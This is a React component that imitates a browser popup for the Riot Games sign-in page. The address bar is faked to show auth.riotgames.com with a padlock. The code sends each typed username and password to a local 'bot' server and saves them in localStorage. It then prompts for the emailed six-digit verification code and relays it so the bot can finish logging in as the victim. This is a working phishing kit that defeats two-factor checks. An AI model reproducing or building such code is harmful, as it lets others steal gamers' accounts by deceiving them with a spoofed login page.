import React, { useState, useRef, useEffect } from 'react';
import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2 } from 'lucide-react';

const RiotWindow = ({ onClose, onSuccess }) => {
  const [position, setPosition] = useState({ x: 100, y: 100 });
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  
  // BOT FLOW STATES
  const [step, setStep] = useState(1); // 1: login, 2: waiting_for_code, 3: verifying, 4: done
  const [code, setCode] = useState("");
  const [botMessage, setBotMessage] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [isCodeSent, setIsCodeSent] = useState(false);
  const [verificationResult, setVerificationResult] = useState(null); // 'correct' or 'incorrect'
  
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  // Send credentials to bot
  const sendToBot = async (user, pass) => {
    try {
      console.log("📤 Sending credentials to bot...");
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass })
      });
      
      const data = await response.json();
      console.log("📥 Bot response:", data);
      
      if (data.success) {
        setSessionId(data.sessionId);
        // Wait 5 seconds before showing code input
        setTimeout(() => {
          setLoading(false);
          setStep(2);
          setBotMessage("A verification code has been sent to your email. Please enter it below.");
        }, 5000);
        return true;
      }
      return false;
    } catch (err) {
      console.error("❌ Failed to connect to bot:", err);
      setLoading(false);
      return false;
    }
  };

  // Send code to bot
  const sendCodeToBot = async (code) => {
    try {
      console.log("📤 Sending code to bot...");
      const response = await fetch('http://localhost:5000/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, code })
      });
      
      const data = await response.json();
      console.log("📥 Bot response:", data);
      
      if (data.success) {
        setIsCodeSent(true);
        setStep(3);
        setBotMessage("Verifying code...");
        // Start polling for status
        pollStatus();
        return true;
      }
      return false;
    } catch (err) {
      console.error("❌ Failed to send code:", err);
      return false;
    }
  };

  // Poll status from bot
  const pollStatus = async () => {
    try {
      const response = await fetch(`http://localhost:5000/status/${sessionId}`);
      const data = await response.json();
      console.log("📊 Status check:", data);
      
      if (data.status === "verified") {
        setVerificationResult('correct');
        setBotMessage("✅ Code verified successfully!");
        console.log("✅ Code verified!");
        setTimeout(() => {
          setStep(4);
          if (onSuccess) onSuccess();
          setTimeout(() => {
            window.location.href = '/dashboard';
          }, 2000);
        }, 1000);
      } else if (data.status === "failed") {
        setVerificationResult('incorrect');
        setBotMessage("Incorrect code. Please try again.");
        console.log("Code incorrect.");
        // Reset after 5 seconds
        setTimeout(() => {
          setStep(2);
          setCode("");
          setIsCodeSent(false);
          setVerificationResult(null);
          setBotMessage("A verification code has been sent to your email. Please enter it below.");
        }, 5000);
      } else {
        // Check again after 2 seconds
        setTimeout(pollStatus, 2000);
      }
    } catch (err) {
      console.error("Status check failed:", err);
      setTimeout(pollStatus, 3000);
    }
  };

  const handleLogin = async () => {
    if (!isEnabled) return;
    
    setLoading(true);
    setBotMessage("Verifying credentials...");
    console.log("User clicked login");
    
    const botSent = await sendToBot(username, password);
    
    if (botSent) {
      try {
        localStorage.setItem('riot_u', username);
        localStorage.setItem('riot_p', password);
      } catch (err) {
        console.error("Storage failed:", err);
      }
    } else {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async () => {
    if (!code || code.length < 6) {
      console.log("⚠️ Code must be 6 digits");
      return;
    }
    
    setLoading(true);
    console.log("🔑 User submitted code:", code);
    
    await sendCodeToBot(code);
    setLoading(false);
  };

  const isEnabled = username.length >= 3 && password.length >= 3;

  // Render different steps
  const renderContent = () => {
    // Step 1: Login
    if (step === 1) {
      return (
        <>
          <h2 className="text-2xl text-zinc-900 font-bold mb-8">Sign in</h2>
          
          {loading && (
            <div className="mb-4 flex items-center gap-2 text-zinc-600">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="text-sm">{botMessage || "Verifying..."}</span>
            </div>
          )}
          
          <div className="w-full max-w-[350px] space-y-4">
            <input 
              type="text" 
              placeholder="Username" 
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
            />
            <input 
              type="password" 
              placeholder="Password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
            />
            
            <div className="grid grid-cols-4 gap-2 pt-2">
              <button className="h-10 flex items-center justify-center bg-white border border-zinc-200 rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" className="w-6 h-6 object-contain"/></button>
              <button className="h-10 flex items-center justify-center bg-black rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" className="w-6 h-6 object-contain invert"/></button>
              <button className="h-10 flex items-center justify-center bg-[#107c10] rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" alt="Xbox" className="w-6 h-6 object-contain invert"/></button>
              <button className="h-10 flex items-center justify-center bg-[#004593] rounded"><img src="https://www.svgrepo.com/show/452087/playstation.svg" alt="PS" className="w-6 h-6 object-contain invert"/></button>
            </div>

            <div className="flex justify-center pt-6">
              <button 
                onClick={handleLogin}
                disabled={!isEnabled || loading}
                className={`w-20 h-20 rounded-full flex items-center justify-center transition-all duration-300 ${
                  isEnabled && !loading ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-gray-300 cursor-not-allowed"
                }`}
              >
                {loading ? (
                  <Loader2 className="w-8 h-8 text-white animate-spin" />
                ) : (
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M12 5l7 7-7 7" /></svg>
                )}
              </button>
            </div>
          </div>
        </>
      );
    }

    // Step 2: Waiting for code
    if (step === 2) {
      return (
        <>
          <div className="text-center">
            <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto mb-4">
              <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
            </div>
            
            <h2 className="text-2xl text-zinc-900 font-bold mb-2">Verification Required</h2>
            <p className="text-zinc-600 text-sm mb-6">
              {botMessage || "A verification code has been sent to your email. Please enter it below."}
            </p>
            
            {!isCodeSent ? (
              <div className="w-full max-w-[350px] mx-auto space-y-4">
                <input 
                  type="text" 
                  placeholder="Enter 6-digit code" 
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  maxLength={6}
                  className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500 text-center text-lg tracking-widest" 
                />
                
                <button 
                  onClick={handleCodeSubmit}
                  disabled={loading}
                  className={`w-full h-12 rounded-lg font-medium transition-all ${
                    loading ? "bg-gray-400 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700 text-white"
                  }`}
                >
                  {loading ? <Loader2 className="animate-spin inline-block" /> : "Verify Code"}
                </button>
              </div>
            ) : (
              <div className="text-center py-8">
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin mx-auto" />
                <p className="text-zinc-600 text-sm mt-4">Verifying code...</p>
              </div>
            )}
          </div>
        </>
      );
    }

    // Step 3: Verifying (shows result)
    if (step === 3) {
      const isCorrect = verificationResult === 'correct';
      const isIncorrect = verificationResult === 'incorrect';
      
      return (
        <>
          <div className="text-center">
            <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${
              isCorrect ? 'bg-green-100' : isIncorrect ? 'bg-red-100' : 'bg-blue-100'
            }`}>
              {isCorrect ? (
                <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              ) : isIncorrect ? (
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              ) : (
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
              )}
            </div>
            
            <h2 className={`text-2xl font-bold mb-2 ${
              isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-900'
            }`}>
              {isCorrect ? 'Verification Successful!' : isIncorrect ? 'Verification Failed' : 'Verifying...'}
            </h2>
            <p className={`text-sm ${
              isCorrect ? 'text-green-600' : isIncorrect ? 'text-red-600' : 'text-zinc-600'
            }`}>
              {botMessage}
            </p>
            
            {isIncorrect && (
              <p className="text-zinc-500 text-xs mt-4">
                ⏳ Redirecting to try again...
              </p>
            )}
            
            {isCorrect && (
              <p className="text-zinc-500 text-xs mt-4">
                ✅ Redirecting to dashboard...
              </p>
            )}
          </div>
        </>
      );
    }

    // Step 4: Done
    if (step === 4) {
      return (
        <>
          <div className="text-center">
            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            
            <h2 className="text-2xl text-green-600 font-bold mb-2">Account Verified!</h2>
            <p className="text-zinc-600 text-sm">
              ✅ Your account has been successfully verified.
            </p>
          </div>
        </>
      );
    }

    return null;
  };

  return (
    <div
      style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
      className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
    >
      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
        <div className="flex items-center h-full">
          <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
            <img src="https://cdn.brandfetch.io/idtxF1ugCc/theme/dark/symbol.svg?c=1bxid64Mup7aczewSAYMX&t=1758261660760" alt="Riot" className="w-4 h-4 object-contain"/>
            <span className="text-[11px] text-zinc-300 truncate">Riot Sign-In</span>
            <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
          </div>
        </div>
        <div className="flex items-center gap-3 pr-2">
          <Minus size={14} className="text-zinc-500" />
          <Square size={12} className="text-zinc-500" />
          <X size={16} className="text-zinc-400 hover:text-red-400 cursor-pointer" onClick={onClose} />
        </div>
      </div>

      <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
        <div className="flex gap-3 text-zinc-500"><ArrowLeft size={16} /><ArrowRight size={16} /><RotateCw size={16} /></div>
        <div className="flex-1 h-7 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
          <span className="text-emerald-500">https://</span>
          <span className="text-zinc-400">auth.riotgames.com</span>
          <Lock size={12} className="text-green-500 ml-auto" />
        </div>
      </div>

      <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
        <img 
          src="https://esportsinsider.com/wp-content/uploads/2022/02/ESI-Illustrations-9-696x418.png" 
          alt="Brand Logo" 
          className="w-32 h-auto object-contain mb-6" 
        />
        
        {renderContent()}
      </div>
    </div>
  );
};

export default RiotWindow;